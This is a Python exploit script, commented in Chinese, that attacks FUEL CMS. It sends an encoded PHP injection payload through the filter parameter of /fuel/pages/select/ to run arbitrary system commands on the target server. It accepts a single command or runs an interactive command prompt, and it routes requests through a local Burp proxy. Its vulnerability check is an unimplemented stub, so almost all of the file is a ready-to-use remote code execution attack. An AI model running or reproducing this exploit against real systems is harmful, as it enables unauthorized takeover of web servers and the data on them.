import requests
import urllib.parse
import argparse

class Vulnerability:
    def __init__(self, target):
        self.target = target

    def find_nth_overlapping(self, haystack, needle, n):
        start = haystack.find(needle)
        while start >= 0 and n > 1:
            start = haystack.find(needle, start+1)
            n -= 1
        return start

    def check(self):
        """
        在这里进行漏洞检查
        """
        raise NotImplementedError

    def exploit(self, cmd):
        """
        在这里执行漏洞利用
        """
        burp0_url = self.target + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27" + urllib.parse.quote(cmd) + "%27%29%2b%27"
        proxy = {"http": "http://127.0.0.1:8080"}
        r = requests.get(burp0_url, proxies=proxy)

        html = "<!DOCTYPE html>"
        htmlcharset = r.text.find(html)

        begin = r.text[0:20]
        dup = self.find_nth_overlapping(r.text, begin, 2)

        print(r.text[0:dup])


def parse_arguments():
    parser = argparse.ArgumentParser(description="对目标进行漏洞检测和利用")
    parser.add_argument("-t", "--target", required=True, help="目标的URL或IP地址")
    parser.add_argument("-c", "--check", action="store_true", help="仅进行漏洞检查")
    parser.add_argument("-e", "--exploit", nargs='?', const=True, help="执行漏洞利用，可以接受一个命令作为参数")
    return parser.parse_args()


def main():
    args = parse_arguments()
    vuln = Vulnerability(args.target)

    if args.check:
        vuln.check()

    if args.exploit:
        if isinstance(args.exploit, str):
            vuln.exploit(args.exploit)
        else:
            while True:
                cmd = input("请输入命令：")
                vuln.exploit(cmd)


if __name__ == "__main__":
    main()
